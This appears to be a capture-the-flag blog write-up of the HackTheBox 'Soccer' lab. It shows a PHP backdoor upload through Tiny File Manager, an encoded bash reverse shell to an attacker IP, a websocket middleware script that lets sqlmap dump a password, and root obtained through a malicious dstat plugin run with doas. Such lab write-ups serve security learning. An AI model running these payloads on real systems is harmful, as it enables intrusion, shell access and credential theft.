---
layout: post
title: Soccer - HackTheBox
date: 29/12/2022
author: Nehal Zaman
tags: ["file upload vulnerability", "tiny file manager RCE", "websockets", "blind sqli", "dstat exploit"]
categories: [writeups]
render_with_liquid: false
---

![](/assets/images/writeups/soccer/banner.png)

# INTRODUCTION

**Soccer** is a nice box on **HackTheBox** created by [sau123](https://www.hackthebox.com/home/users/profile/201596).

Foothold on this box is achieved by a RCE.

Then a blind SQL injection gets us user access.

Finally, we get root by exploiting the user's privileged rights.

# SCANNING

```bash

┌──(n3hal㉿Universe7)-[~/Documents/hackthebox/soccer]
└─$ rustscan -a 10.10.11.194 -r 1-65535 --ulimit 5000                           
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/n3hal/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.11.194:22
Open 10.10.11.194:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-29 01:40 EST
Initiating Ping Scan at 01:40
Scanning 10.10.11.194 [2 ports]
Completed Ping Scan at 01:40, 0.25s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 01:40
Completed Parallel DNS resolution of 1 host. at 01:40, 5.56s elapsed
DNS resolution of 1 IPs took 5.56s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 3, CN: 0]
Initiating Connect Scan at 01:40
Scanning 10.10.11.194 [2 ports]
Discovered open port 80/tcp on 10.10.11.194
Discovered open port 22/tcp on 10.10.11.194
Completed Connect Scan at 01:40, 0.25s elapsed (2 total ports)
Nmap scan report for 10.10.11.194
Host is up, received syn-ack (0.25s latency).
Scanned at 2022-12-29 01:40:16 EST for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 6.19 seconds

```

We can see `rustscan` found ports `22` and `80` to be open.

```bash

┌──(n3hal㉿Universe7)-[~/Documents/hackthebox/soccer]
└─$ nmap -sC -sV -p- -T4 10.10.11.194                     
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-29 01:41 EST
Nmap scan report for 10.10.11.194
Host is up (0.25s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)
|   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)
|_  256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soccer.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 139
|     Date: Thu, 29 Dec 2022 07:00:37 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot GET /</pre>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Thu, 29 Dec 2022 07:00:37 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|     </html>
|   RTSPRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Thu, 29 Dec 2022 07:00:38 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9091-TCP:V=7.92%I=7%D=12/29%Time=63AD3B04%P=x86_64-pc-linux-gnu%r(i
SF:nformix,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\
SF:r\n\r\n")%r(drda,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\
SF:x20close\r\n\r\n")%r(GetRequest,168,"HTTP/1\.1\x20404\x20Not\x20Found\r
SF:\nContent-Security-Policy:\x20default-src\x20'none'\r\nX-Content-Type-O
SF:ptions:\x20nosniff\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nC
SF:ontent-Length:\x20139\r\nDate:\x20Thu,\x2029\x20Dec\x202022\x2007:00:37
SF:\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lan
SF:g=\"en\">\n<head>\n<meta\x20charset=\"utf-8\">\n<title>Error</title>\n<
SF:/head>\n<body>\n<pre>Cannot\x20GET\x20/</pre>\n</body>\n</html>\n")%r(H
SF:TTPOptions,16C,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Po
SF:licy:\x20default-src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\
SF:nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20143
SF:\r\nDate:\x20Thu,\x2029\x20Dec\x202022\x2007:00:37\x20GMT\r\nConnection
SF::\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<m
SF:eta\x20charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>
SF:Cannot\x20OPTIONS\x20/</pre>\n</body>\n</html>\n")%r(RTSPRequest,16C,"H
SF:TTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Policy:\x20default-
SF:src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nContent-Type:\x2
SF:0text/html;\x20charset=utf-8\r\nContent-Length:\x20143\r\nDate:\x20Thu,
SF:\x2029\x20Dec\x202022\x2007:00:38\x20GMT\r\nConnection:\x20close\r\n\r\
SF:n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<meta\x20charset=\"
SF:utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot\x20OPTIONS
SF:\x20/</pre>\n</body>\n</html>\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Ba
SF:d\x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2
SF:F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")
SF:%r(DNSStatusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnec
SF:tion:\x20close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\
SF:r\nConnection:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\
SF:x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1156.49 seconds

```

But `nmap` found port `9091` to be open, apart from `22` and `80`.

One lesson here, _always verify output of one tool using another tool_.

`SSH` service is running on port `22`, `HTTP` service in ports `80` and `9091`.

We also can see a domain name `soccer.htb`. Let us add this in the `/etc/hosts` file.

```bash

┌──(n3hal㉿Universe7)-[~/Documents/hackthebox/soccer]
└─$ nmap -sC -sV -p80 soccer.htb 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-29 02:18 EST
Nmap scan report for soccer.htb (10.10.11.194)
Host is up (0.25s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Soccer - Index 
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.95 seconds

```

We have `nginx 1.18.0` running on port `80`.

# ENUMERATING WEB

![](/assets/images/writeups/soccer/1.png)

We can see a static site running on port `80`. 

```bash

┌──(n3hal㉿Universe7)-[~/Documents/hackthebox/soccer]
└─$ dirsearch -u http://soccer.htb/ -w /usr/share/wordlists/dirb/big.txt -t 50

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 20469

Output File: /home/n3hal/.dirsearch/reports/soccer.htb/-_22-12-29_02-23-34.txt

Error Log: /home/n3hal/.dirsearch/logs/errors-22-12-29_02-23-34.log

Target: http://soccer.htb/

[02:23:35] Starting: 
[02:27:18] 301 -  178B  - /tiny  ->  http://soccer.htb/tiny/

Task Completed

```

`dirsearch` finds a directory `/tiny` on the application.

![](/assets/images/writeups/soccer/2.png)

`Tiny File Manager` is running on `/tiny` directory of the web application.

Googling a bit, we will come to know that the default credentials for this application in `admin:admin@123`.

![](/assets/images/writeups/soccer/3.png)

With the credentials we are able to log in.

From the navbar above, we can see that we can upload file. 

But while creating a file in the website root, we get the error message:

```

Cannot open file: shell.php

```

This is probably due to the permission issues.


![](/assets/images/writeups/soccer/4.png)

But we can definitely create files in `/tiny/uploads/` directory.

In this case, I have created a simple PHP backdoor.

The backdoor can be triggered as:

```bash

http://soccer.htb/tiny/uploads/curiosity.php?cmd=id

```

![](/assets/images/writeups/soccer/5.png)


We achieved `RCE` through `file upload vulnerability`.

# SHELL AS WWW-DATA

We can use simple bash reverse shell.

```bash

echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41MC80NDMgMD4mMQo= | base64 -d | bash

```

URL encoding the payload so that dangerous characters does not create a problem:

```bash

%65%63%68%6f%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%31%4d%43%38%30%4e%44%4d%67%4d%44%34%6d%4d%51%6f%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68

```

URL: 

```bash

http://soccer.htb/tiny/uploads/curiosity.php?cmd=%65%63%68%6f%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%31%4d%43%38%30%4e%44%4d%67%4d%44%34%6d%4d%51%6f%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68

```

```bash

┌──(n3hal㉿Universe7)-[~/Documents/hackthebox/soccer]
└─$ nc -nlp 443
bash: cannot set terminal process group (1041): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.0$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash-5.0$ whoami
whoami
www-data
bash-5.0$ 

```

# ENUMERATING THE BOX

```bash

bash-5.0$ netstat -tulpn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:9091            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1106/nginx: worker  
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      1106/nginx: worker  
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                  

```

We can see `MySQL` is running internally as port `3306` is open and an unknown service on localhost port `3000`.

```bash

bash-5.0$ ls -al /etc/nginx/sites-enabled/
total 8
drwxr-xr-x 2 root root 4096 Dec  1 13:48 .
drwxr-xr-x 8 root root 4096 Nov 17 08:06 ..
lrwxrwxrwx 1 root root   34 Nov 17 08:06 default -> /etc/nginx/sites-available/default
lrwxrwxrwx 1 root root   41 Nov 17 08:39 soc-player.htb -> /etc/nginx/sites-available/soc-player.htb
bash-5.0$ cat /etc/nginx/sites-enabled/soc-player.htb 
server {
	listen 80;
	listen [::]:80;

	server_name soc-player.soccer.htb;

	root /root/app/views;

	location / {
		proxy_pass http://localhost:3000;
		proxy_http_version 1.1;
		proxy_set_header Upgrade $http_upgrade;
		proxy_set_header Connection 'upgrade';
		proxy_set_header Host $host;
		proxy_cache_bypass $http_upgrade;
	}

}

```

Looking at the `nginx` configuration directory, we can see two `conf` files in `site-enabled` section.

The `soc-player.htb` configuration file reveals a subdomain `soc-player.soccer.htb` which is basically the web appplication on localhost port `3000`.

Let us add that to the `/etc/hosts`.

# BACK TO WEB ENUMERATION

Visiting the `http://soc-player.soccer.htb/` website, we can see the below page:

![](/assets/images/writeups/soccer/6.png)

Well, we can see the old template with few features here: `login`, `signup` and other things.

Now that we have login features, having `MySQL` running internally creates a sense.

Let us create a dummy account: `test@curiosity.hacks : test`.

![](/assets/images/writeups/soccer/7.png)

We can see a `ticket ID` and a text box which seems doing nothing.

Let us check that in burpsuite.

![](/assets/images/writeups/soccer/8.png)

The `input box` is not at all worthless, the value in that box is passed as websocket message to `ws://soc-player.soccer.htb:9091`.

![](/assets/images/writeups/soccer/9.png)

For a valid ticket, the server replies with `Ticket Exists`.

![](/assets/images/writeups/soccer/10.png)

For an invalid ticket, the server replies with `Ticket Doesn't Exist`.

# SQL INJECTION IN WEBSOCKET

Since there is `MySQL` is running and there is checking if a ticket is valid, the most obvious vulnerability in this case is a `SQL injection`.

![](/assets/images/writeups/soccer/12.png)

We can see that the ticket does not exist for payload `69081 AND 1=2 -- - `.

![](/assets/images/writeups/soccer/11.png)

Again, we see that the ticket exists for payload `69081 AND 1=1 -- - `.

In the first case, due to the `AND 1=2` the whole query returns nothing and we see the error message `Ticket Doesn't Exist`.

In the second case, the `AND 1=1` returns a valid ticket and we see `Ticket Exists`.

This confirms there is a blind SQL injection in the websocket.

# EXPLOITING SQL INJECTION

Unfortunately, `sqlmap` does not have the support for testing websockets.

But we can definitely create a proxy HTTP service that redirects the message to the websocket.

```python

from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import unquote, urlparse
from websocket import create_connection

ws_server = "ws://soc-player.soccer.htb:9091"

def send_ws(payload):
	ws = create_connection(ws_server)
	# If the server returns a response on connect, use below line	
	#resp = ws.recv() # If server returns something like a token on connect you can find and extract from here
	
	# For our case, format the payload in JSON
	message = unquote(payload).replace('"','\'') # replacing " with ' to avoid breaking JSON structure
	data = '{"id":"%s"}' % message

	ws.send(data)
	resp = ws.recv()
	ws.close()

	if resp:
		return resp
	else:
		return ''

def middleware_server(host_port,content_type="text/plain"):

	class CustomHandler(SimpleHTTPRequestHandler):
		def do_GET(self) -> None:
			self.send_response(200)
			try:
				payload = urlparse(self.path).query.split('=',1)[1]
			except IndexError:
				payload = False
				
			if payload:
				content = send_ws(payload)
			else:
				content = 'No parameters specified!'

			self.send_header("Content-type", content_type)
			self.end_headers()
			self.wfile.write(content.encode())
			return

	class _TCPServer(TCPServer):
		allow_reuse_address = True

	httpd = _TCPServer(host_port, CustomHandler)
	httpd.serve_forever()


print("[+] Starting MiddleWare Server")
print("[+] Send payloads in http://localhost:8081/?id=*")

try:
	middleware_server(('0.0.0.0',1337))
except KeyboardInterrupt:
	pass

``` 

This script has been taken from [here](https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html). Kudos to `rayhan0x01` for his amazing explanation.

This script just creates a HTTP server and takes the value of `id` parameter in each request and passes it to given websocket as a message.

Now we can use `sqlmap` on this proxy, which is basically the same as running `sqlmap` on the websocket.

Running the proxy:

```bash

┌──(n3hal㉿Universe7)-[~/…/hackthebox/soccer/web/exploits]
└─$ python middleware.py
[+] Starting MiddleWare Server
[+] Send payloads in http://localhost:1337/?id=*

```

Running `sqlmap`:

```bash

┌──(n3hal㉿Universe7)-[~/…/hackthebox/soccer/web/exploits]
└─$ sqlmap -u "http://localhost:1337/?id=1" --dbms mysql --batch  
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.6.8#stable}
|_ -| . ["]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 04:31:16 /2022-12-29/

[04:31:18] [INFO] testing connection to the target URL
[04:31:19] [WARNING] turning off pre-connect mechanism because of incompatible server ('SimpleHTTP/0.6 Python/3.10.8')
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 6779 FROM (SELECT(SLEEP(5)))zdVp)
---
[04:31:19] [INFO] testing MySQL
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[04:31:54] [INFO] confirming MySQL
[04:31:54] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
[04:32:06] [INFO] adjusting time delay to 2 seconds due to good response times
[04:32:06] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 8.0.0
[04:32:06] [INFO] fetched data logged to text files under '/home/n3hal/.local/share/sqlmap/output/localhost'

[*] ending @ 04:32:06 /2022-12-29/

```

`sqlmap` detects the `time-based blind injection`.

After tinkering with the SQLi, you will know that there is a `soccer_db` database with a table called `accounts` having a column called `password`.

```bash

┌──(n3hal㉿Universe7)-[~/…/hackthebox/soccer/web/exploits]
└─$ sqlmap -u "http://localhost:1337/?id=1" -D soccer_db -T accounts -C password --dump
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.6.8#stable}
|_ -| . [)]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 04:34:57 /2022-12-29/

[04:34:57] [INFO] resuming back-end DBMS 'mysql' 
[04:34:57] [INFO] testing connection to the target URL
[04:34:59] [WARNING] turning off pre-connect mechanism because of incompatible server ('SimpleHTTP/0.6 Python/3.10.8')
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 6779 FROM (SELECT(SLEEP(5)))zdVp)
---
[04:34:59] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL 8
[04:34:59] [INFO] fetching entries of column(s) 'password' for table 'accounts' in database 'soccer_db'
[04:34:59] [INFO] fetching number of column(s) 'password' entries for table 'accounts' in database 'soccer_db'
[04:34:59] [INFO] resumed: 1
[04:34:59] [INFO] resumed: PlayerOftheMatch2022
Database: soccer_db
Table: accounts
[1 entry]
+----------------------+
| password             |
+----------------------+
| PlayerOftheMatch2022 |
+----------------------+

[04:34:59] [INFO] table 'soccer_db.accounts' dumped to CSV file '/home/n3hal/.local/share/sqlmap/output/localhost/dump/soccer_db/accounts.csv'
[04:34:59] [INFO] fetched data logged to text files under '/home/n3hal/.local/share/sqlmap/output/localhost'

[*] ending @ 04:34:59 /2022-12-29/

```

We have dumped a password: `PlayerOftheMatch2022`.

# SHELL AS PLAYER

```bash

bash-5.0$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:112:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
player:x:1001:1001::/home/player:/bin/bash
mysql:x:113:121:MySQL Server,,,:/nonexistent:/bin/false
_laurel:x:997:997::/var/log/laurel:/bin/false

```

The user in this box is: `player`.

We can use the same dumped password to log into `player`'s account.

```bash

bash-5.0$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash-5.0$ 
bash-5.0$ su - player
Password: 
-bash-5.0$ 
-bash-5.0$ id
uid=1001(player) gid=1001(player) groups=1001(player)

```

# PRIVILEGE ESCALATION

```bash

-bash-5.0$ find / -type f -perm -4000 2>/dev/null
/usr/local/bin/doas
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/bin/umount
/usr/bin/fusermount
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/bash
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/at
/snap/snapd/17883/usr/lib/snapd/snap-confine
/snap/core20/1695/usr/bin/chfn
/snap/core20/1695/usr/bin/chsh
/snap/core20/1695/usr/bin/gpasswd
/snap/core20/1695/usr/bin/mount
/snap/core20/1695/usr/bin/newgrp
/snap/core20/1695/usr/bin/passwd
/snap/core20/1695/usr/bin/su
/snap/core20/1695/usr/bin/sudo
/snap/core20/1695/usr/bin/umount
/snap/core20/1695/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1695/usr/lib/openssh/ssh-keysign

```

Looking for `SUID` files we can see that the `doas` is present in this box.

```bash

-bash-5.0$ find / -name doas* 2>/dev/null
/usr/local/share/man/man5/doas.conf.5
/usr/local/share/man/man1/doas.1
/usr/local/share/man/man8/doasedit.8
/usr/local/bin/doasedit
/usr/local/bin/doas
/usr/local/etc/doas.conf

```

The `conf` file of `doas` is at: `/usr/local/etc/doas.conf`.

```bash

-bash-5.0$ cat /usr/local/etc/doas.conf
permit nopass player as root cmd /usr/bin/dstat

```

We can see that the user `player` can run `/usr/bin/dstat` as root without password using `doas`.

`dstat` is a versatile tool for generating system resource statistics.

It allows users to create a custom plugin and execute by adding option e.g. `dstat --myplugin`. 

Learn more about it [here](https://exploit-notes.hdks.org/exploit/sudo-privilege-escalation/).

First, we need to find where we can create our plugin.

```bash

-bash-5.0$ find / -type d -name dstat 2>/dev/null
/usr/share/doc/dstat
/usr/share/dstat
/usr/local/share/dstat

```

The plugins can be created in `/usr/local/share/dstat` directory.

```bash

-bash-5.0$ pwd
/usr/local/share/dstat
-bash-5.0$ 
-bash-5.0$ ls
dstat_curiosity.py
-bash-5.0$ 
-bash-5.0$ cat dstat_curiosity.py 
import os

os.system("/bin/bash")

```

A file `dstat_curiosity.py` is created at `/usr/local/share/dstat`. The name of the file must be `dstat_<name>.py` to be a valid plugin.

The file just runs `/bin/bash`.

```bash

-bash-5.0$ doas -u root /usr/bin/dstat --list
internal:
	aio,cpu,cpu-adv,cpu-use,cpu24,disk,disk24,disk24-old,epoch,fs,int,int24,io,ipc,load,lock,mem,mem-adv,net,page,page24,proc,raw,socket,swap,swap-old,sys,tcp,time,
	udp,unix,vm,vm-adv,zones
/usr/share/dstat:
	battery,battery-remain,condor-queue,cpufreq,dbus,disk-avgqu,disk-avgrq,disk-svctm,disk-tps,disk-util,disk-wait,dstat,dstat-cpu,dstat-ctxt,dstat-mem,fan,freespace,fuse,
	gpfs,gpfs-ops,helloworld,ib,innodb-buffer,innodb-io,innodb-ops,jvm-full,jvm-vm,lustre,md-status,memcache-hits,mongodb-conn,mongodb-mem,mongodb-opcount,mongodb-queue,
	mongodb-stats,mysql-io,mysql-keys,mysql5-cmds,mysql5-conn,mysql5-innodb,mysql5-innodb-basic,mysql5-innodb-extra,mysql5-io,mysql5-keys,net-packets,nfs3,nfs3-ops,nfsd3,
	nfsd3-ops,nfsd4-ops,nfsstat4,ntp,postfix,power,proc-count,qmail,redis,rpc,rpcd,sendmail,snmp-cpu,snmp-load,snmp-mem,snmp-net,snmp-net-err,snmp-sys,snooze,squid,test,
	thermal,top-bio,top-bio-adv,top-childwait,top-cpu,top-cpu-adv,top-cputime,top-cputime-avg,top-int,top-io,top-io-adv,top-latency,top-latency-avg,top-mem,top-oom,utmp,vm-cpu,
	vm-mem,vm-mem-adv,vmk-hba,vmk-int,vmk-nic,vz-cpu,vz-io,vz-ubc,wifi,zfs-arc,zfs-l2arc,zfs-zil
/usr/local/share/dstat:
	curiosity

```

We can see that the plugin has been loaded.

```bash

-bash-5.0$ doas -u root /usr/bin/dstat --curiosity
/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses
  import imp
root@soccer:/usr/local/share/dstat# 
root@soccer:/usr/local/share/dstat# id; whoami
uid=0(root) gid=0(root) groups=0(root)
root
root@soccer:/usr/local/share/dstat# 
root@soccer:/usr/local/share/dstat# hostname
soccer
root@soccer:/usr/local/share/dstat# 

```

We can simply run the plugin as `dstat --<plugin name>`. 

Running the plugin with `doas` gives us `root` shell.

# CONCLUSION

The box is all about exploiting a file upload to RCE vulnerability in `Tiny File Manager`, then exploiting a blind SQL injection through web sockets and privilege escalation by exploiting doas rights of a user.

Overall the box is easy yet lengthy. 

The intial file upload to RCE issue is quite obvious. 

The main takeaway from this box can be about how to exploit server side vulnerabilites like `SQLi` in websockets, as this is something which is not commonly seen in CTFs.

The privilege escalation part is just a simple googling stuff.

This is all in this box.

Thanks for reading this far.

Hope you liked it. 